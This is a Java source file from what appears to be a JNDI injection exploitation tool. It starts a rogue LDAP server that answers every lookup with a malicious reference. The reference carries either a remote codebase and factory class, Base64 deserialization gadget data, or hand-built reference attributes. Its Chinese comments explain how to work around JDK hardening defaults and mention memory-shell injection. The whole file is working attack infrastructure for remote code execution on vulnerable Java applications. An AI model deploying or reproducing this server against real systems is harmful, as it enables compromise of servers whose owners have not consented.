package com.bloom.server;

import com.bloom.Template.CommandTemplate;
import com.bloom.parser.ParsedRoute;
import com.bloom.parser.RouteParser;
import com.bloom.session.VerificationSession;
import com.bloom.util.config;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import javax.naming.RefAddr;
import javax.naming.Reference;
import java.net.InetAddress;
import java.net.URL;
import java.util.Enumeration;

import com.bloom.exploit.RefFactory;

import com.bloom.exploit.chain.ChainDispatcher;
import static com.bloom.util.Functions.getRandomString;
import static com.bloom.util.Functions.ipCheck;

public class LdapServer extends InMemoryOperationInterceptor {

    private static final String LDAP_BASE = "dc=example,dc=com";
    private static final RouteParser routeParser = new RouteParser();
    private static final VerificationSession session = new VerificationSession();

    public static void lanuchLDAPServer() throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    com.bloom.util.config.ldapPort,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new LdapServer.OperationInterceptor(new URL("http://"+com.bloom.util.config.ip+":"+com.bloom.util.config.httpPort+"/#"+getRandomString())));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + com.bloom.util.config.ldapPort);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base);
            e.addAttribute("javaClassName", "foo");

            ParsedRoute route = routeParser.parse(base);
            String sourceIp = result.getConnectedAddress();

            if (!route.isValid()) {
                System.out.println("路径解析失败: " + route.getValidationErrors());
                session.recordHit(sourceIp, route, null);
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                return;
            }

            String payloadResult = null;
            String className = "";

            if (route.getRouteType() != null && route.getRouteType().name().equals("BASIC")) {
                String method = route.getMethod();
                String command = route.getCommand();
                CommandTemplate commandTemplate = new CommandTemplate(command);
                commandTemplate.cache();
                className = commandTemplate.getClassName();
                e.addAttribute("javaCodeBase", String.valueOf(this.codebase).split("#")[0]);
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaFactory", className);
                payloadResult = className;
            } else {
                // Reference 系默认走 javaSerializedData（序列化 ResourceRef）投递：
                // 目标端从 javaReferenceAddress 属性只能重建出裸 javax.naming.Reference，
                // 不满足 BeanFactory 的 instanceof ResourceRef 判断会直接返回 null；
                // 反序列化得到的 ResourceRef 才能命中工厂。
                // 目标端前提：trustSerialData=true（8u431/11.0.25/17.0.13/21.0.5 起默认 false），
                // 且 JDK 21+ 的 jdk.jndi.ldap.object.factoriesFilter 默认仅放行 JDK 内置工厂，
                // 该条件下两种投递均不可用。
                // --ref-attrs 回退属性直返（仅限接受裸 Reference 的工厂，如 MemoryUserDatabaseFactory）。
                boolean useRefAttrs = config.refAttrs && RefFactory.supports(route.getPayloadType());
                Reference ref = useRefAttrs ? ChainDispatcher.generateReference(route) : null;
                if (ref != null) {
                    writeReferenceAttributes(e, ref);
                    payloadResult = "ref:" + route.getPayloadType();
                } else if (useRefAttrs) {
                    // RefFactory 支持但拒绝生成（如 ELjakarta 内存马注入），已明确报错，
                    // 不回退序列化路径产出废 payload
                    System.out.println("Reference 生成被拒绝: " + route.getPayloadType());
                } else {
                    String s = ChainDispatcher.generate(route);
                    if (s == null) {
                        System.out.println(RefFactory.supports(route.getPayloadType())
                                ? "Reference 生成被拒绝: " + route.getPayloadType()
                                : "生成payload失败，使用的模块类型不正确或者命令错误");
                    } else {
                        try {
                            e.addAttribute("javaSerializedData", Base64.decode(s));
                            payloadResult = s;
                        } catch (Exception e1) {
                            System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
                        }
                    }
                }
            }

            session.recordHit(sourceIp, route, payloadResult);
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

        // 把 Reference 拆成 JNDI LDAP 属性（javaClassName/javaFactory/javaReferenceAddress），
        // javaReferenceAddress 按 RefAddr 序号编码为 #<i>#<type>#<content>（RFC 2713 语义手写）。
        private void writeReferenceAttributes ( Entry e, Reference ref ) {
            e.setAttribute("javaClassName", ref.getClassName());
            e.setAttribute("javaFactory", ref.getFactoryClassName());
            e.addAttribute("objectClass", "javaNamingReference");
            Enumeration<? extends RefAddr> addrs = ref.getAll();
            int i = 0;
            while (addrs.hasMoreElements()) {
                RefAddr addr = addrs.nextElement();
                String content = addr.getContent() == null ? "" : addr.getContent().toString();
                e.addAttribute("javaReferenceAddress", "#" + i + "#" + addr.getType() + "#" + content);
                i++;
            }
        }
    }

    public static VerificationSession getSession() {
        return session;
    }
}
